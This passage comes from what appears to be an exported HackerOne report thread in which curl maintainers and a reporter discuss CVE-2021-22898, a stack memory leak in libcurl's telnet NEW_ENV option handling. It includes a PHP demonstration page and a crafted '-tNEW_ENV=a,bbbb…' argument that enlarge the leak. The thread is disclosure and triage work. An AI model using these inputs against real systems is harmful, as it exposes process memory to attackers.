+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11536499,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "It is an interesting question how much validation should be done, and to what parts to extend it to. Here are some of my thoughts:\n\n- Invalid (non-NULL) pointers via the libcurl API is something that does not need to be guarded against, nor does it make any sense to try to. For example I think it doesn't make sense to validate if invalid data pointer is passed or if `struct curl_slist *` `next` or `data` pointers point to a valid address. Any such failure is fault of the application, and if user input manages to create invalid data, it is a bug of the application not libcurl.\n- Any pointer to input object with specific format (0 terminated strings, byte ptr + len etc) should be validated  and guarded against invalid input. For example that processing the input string doesn't overflow any internal buffers in libcurl when parsing the data, and that the data is of expected format. If invalid or unexpected format is detected, it should be handled in a controlled manner. Typically this means cleaning up any already allocated resources and returning an error code, or considering the input truncated. This should be documented and handled consistently over similar functionality. This naturally also includes parsing of protocol data (http, tls, ftp, telnet, smtp, pop, ftp and so on).\n- Any output byte ptr + len should not be overflown by any libcurl functionality. What actually will happen on excess data should be documented (whether data is truncated, how it is is terminated (if applicable), or if an error return code is returned instead). This also should be handled consistently over similar functionality. This naturally also includes internal generation of protocol data (http, tls, ftp, telnet, smtp, pop, ftp and so on).\n\nMy feeling is that this is what libcurl is doing already pretty much. I'm not entirely sure if this is formally documented anywhere, but if not, maybe it should be. The above is somewhat inconsistently laid out but feel free to reuse or use it in any (modified/improved) form if it might prove useful.\n\nSpecific, in the context of this bug, this means that:\n- CURLOPT\\_TELNETOPTIONS `struct curl_slist *` pointer or `next` or `data` pointer need not be validated for invalid addresses.\n- The actual strings passed in 'data' however should be validated and invalid data processed gracefully. How invalid data is processed should be documented (if overly long strings are truncated or if the whole operation will fail if invalid option data is met. At the moment such documentation seems to be missing.\n\nThe 2nd bit is where this bug is located: Due to an oversight it doesn't properly validate that the `NEW_ENV` have both pairs in the format. This results in reuse of previous data and will lead to leak of previous stack contents.",
+      "automated_response": false,
+      "created_at": "2021-04-27T17:50:15.621Z",
+      "updated_at": "2021-04-27T17:50:15.621Z",
+      "actor": {
+        "username": "nyymi",
+        "cleared": false,
+        "verified": false,
+        "url": "/nyymi",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11542520,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I think you're conflating two different things.\n\nFirst: I'm certainly of the opinion that libcurl should check the input and bail out if there are errors in what's provided. At least to an extent that is sensible and doable. We also expect applications to follow the API documentation.\n\nThen there's a separate discussion: libcurl takes options that alter how it behaves. We cannot make libcurl \"survive\" an attacker that can control what is set to specific libcurl options. In most cases such an attacker wouldn't have to create illegally formatted input to an option, such an attacker would then rather just change a few crucial options to make libcurl behave completely different than what the original purpose of the application was. Or just pass in crap/bad data that libcurl cannot verify without crashing.",
+      "automated_response": false,
+      "created_at": "2021-04-28T06:33:22.799Z",
+      "updated_at": "2021-04-28T06:33:22.799Z",
+      "actor": {
+        "username": "bagder",
+        "cleared": false,
+        "verified": false,
+        "url": "/bagder",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071252Z&X-Amz-Expires=3586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84ff8a0b7c34ee34a86130a3d0d905f8c714119e039bb8bd8ebc21ea987b393c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11543257,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I certainly agree in that if the attacker change the option in that it changes the behaviour, as documented, it certainly isn't a security vulnerability in libcurl.\n\nHowever, I also think that merely adjusting string value (that is reasonable to think can originate from untrusted source) should not result in leaking  internal application state (heap or stack memory), and that this is a vulnerability in libcurl.\n\nI believe that `CURLOPT_TELNETOPTIONS` is bit of a fringe case as it is not that commonly used, and it might be rather uncommon to be see it used in a way that would lead to this specific vulnerability to exploitable. But lets imagine we would have a similar vulnerability in `CURLOPT_URL`, in a way that specifying a specially crafted value would result in the data returned to include parts of the uninitialized heap or stack contents. Lets imagine a php curl application in that where attacker would have partial control of the `CURLOPT_URL` parameter in a way that they can trigger the vulnerability by adjusting GET or POST parameter passed to the PHP web application (*).\n\nI think libcurl should protect against such behaviour, and having bugs such as these should be considered a security vulnerability.\n\n*) Of course such construct might also lead to additional set of vulnerabilities such as SSRF, too.\n\n(Oh, fancy, there's edit option available for some minutes after posting. cool!)",
+      "automated_response": false,
+      "created_at": "2021-04-28T07:06:03.802Z",
+      "updated_at": "2021-04-28T07:13:42.370Z",
+      "actor": {
+        "username": "nyymi",
+        "cleared": false,
+        "verified": false,
+        "url": "/nyymi",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11543272,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Sorry, I lost train of thought there, should have said \"having bugs such as these should be considered a security vulnerability.\"",
+      "automated_response": false,
+      "created_at": "2021-04-28T07:07:48.736Z",
+      "updated_at": "2021-04-28T07:07:48.736Z",
+      "actor": {
+        "username": "nyymi",
+        "cleared": false,
+        "verified": false,
+        "url": "/nyymi",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11544540,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Here is a super simplified example of a PHP app that in my opinion should never divulge the contents of the php process stack, regardless what parameters you put to the form fields. Yet, it can be coaxed to do that by manipulating the env parameters as described in this ticket.\n\n```\n<!doctype html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>libcurl telnet test</title>\n</head>\n\n<body>\n\n<?php\n\nif (isset($_POST['server']) && isset($_POST['env']))\n{\n  $server = $_POST['server'];\n  if (filter_var($server, FILTER_VALIDATE_IP))\n  {\n    $env = array();\n    foreach($_POST['env'] as $key => $value) {\n      $env[] = 'NEW_ENV=' . $value;\n    }\n\n    $ch = curl_init('telnet://' . $server);\n    curl_setopt($ch, CURLOPT_TELNETOPTIONS, $env);\n    curl_setopt($ch, CURLOPT_TIMEOUT, 2);\n    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);\n    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'foo');\n    $output=curl_exec($ch);\n    curl_close($ch);\n  }\n}\n\n?>\n\n<form method=\"POST\">\n  <label for=\"\">telnet server:</label><br>\n  <input type=\"text\" id=\"server\" name=\"server\" value=\"127.0.0.1\"><br>\n  <label for=\"\">env:</label><br>\n  <input type=\"text\" name=\"env[0]\" value=\"foo,bar\" /><br>\n  <input type=\"text\" name=\"env[1]\" /><br>\n  <input type=\"text\" name=\"env[2]\" /><br>\n  <input type=\"text\" name=\"env[4]\" /><br>\n  <input type=\"text\" name=\"env[5]\" /><br>\n  <input type=\"text\" name=\"env[6]\" /><br>\n  <input type=\"text\" name=\"env[7]\" /><br>\n  <button type=\"submit\">Submit</button>\n</form>\n\n</body>\n</html>\n```",
+      "automated_response": false,
+      "created_at": "2021-04-28T09:09:15.745Z",
+      "updated_at": "2021-04-28T09:09:15.745Z",
+      "actor": {
+        "username": "nyymi",
+        "cleared": false,
+        "verified": false,
+        "url": "/nyymi",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11566237,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Confirmed. I'd like to fix this issue and release an advisory in sync with the pending next release, unless someone thinks this needs a faster processing! I will get a CVE and write up an advisory within the next few days.",
+      "automated_response": false,
+      "created_at": "2021-04-29T14:08:55.196Z",
+      "updated_at": "2021-04-29T14:08:55.196Z",
+      "actor": {
+        "username": "bagder",
+        "cleared": false,
+        "verified": false,
+        "url": "/bagder",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071252Z&X-Amz-Expires=3586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84ff8a0b7c34ee34a86130a3d0d905f8c714119e039bb8bd8ebc21ea987b393c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11566428,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "FYI, this bug was introduced in this commit: https://github.com/curl/curl/commit/a1d6ad2610 (February 20, 2001 - curl 7.7). More than 20 years ago.",
+      "automated_response": false,
+      "created_at": "2021-04-29T14:27:57.564Z",
+      "updated_at": "2021-04-29T14:27:57.564Z",
+      "actor": {
+        "username": "bagder",
+        "cleared": false,
+        "verified": false,
+        "url": "/bagder",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071252Z&X-Amz-Expires=3586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84ff8a0b7c34ee34a86130a3d0d905f8c714119e039bb8bd8ebc21ea987b393c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11566604,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I think this CWE seems reasonable:\n\nCWE-457: Use of Uninitialized Variable\n\nhttps://cwe.mitre.org/data/definitions/457.html",
+      "automated_response": false,
+      "created_at": "2021-04-29T14:42:38.935Z",
+      "updated_at": "2021-04-29T14:42:38.935Z",
+      "actor": {
+        "username": "bagder",
+        "cleared": false,
+        "verified": false,
+        "url": "/bagder",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071252Z&X-Amz-Expires=3586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84ff8a0b7c34ee34a86130a3d0d905f8c714119e039bb8bd8ebc21ea987b393c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11566985,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "we can make the attack send a larger share of stack data by adapting the command line a little and use a shorter variable name:\n\n`-tNEW_ENV=a,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb`\n\nThis sends 3 bytes of known content, then 253 bytes of stack content for each variable, so unless I'm doing my math wrong we can send (7*253) 1771 bytes of stack contents in the (2048 - 6) bytes used.",
+      "automated_response": false,
+      "created_at": "2021-04-29T15:16:22.374Z",
+      "updated_at": "2021-04-29T15:16:22.374Z",
+      "actor": {
+        "username": "bagder",
+        "cleared": false,
+        "verified": false,
+        "url": "/bagder",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071252Z&X-Amz-Expires=3586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84ff8a0b7c34ee34a86130a3d0d905f8c714119e039bb8bd8ebc21ea987b393c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11567302,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-04-29T15:42:21.531Z",
+      "updated_at": "2021-04-29T15:42:21.531Z",
+      "cve_ids": [
+        "CVE-2021-22898"
+      ],
+      "actor": {
+        "username": "bagder",
+        "cleared": false,
+        "verified": false,
+        "url": "/bagder",
+        "profile_picture_urls": {
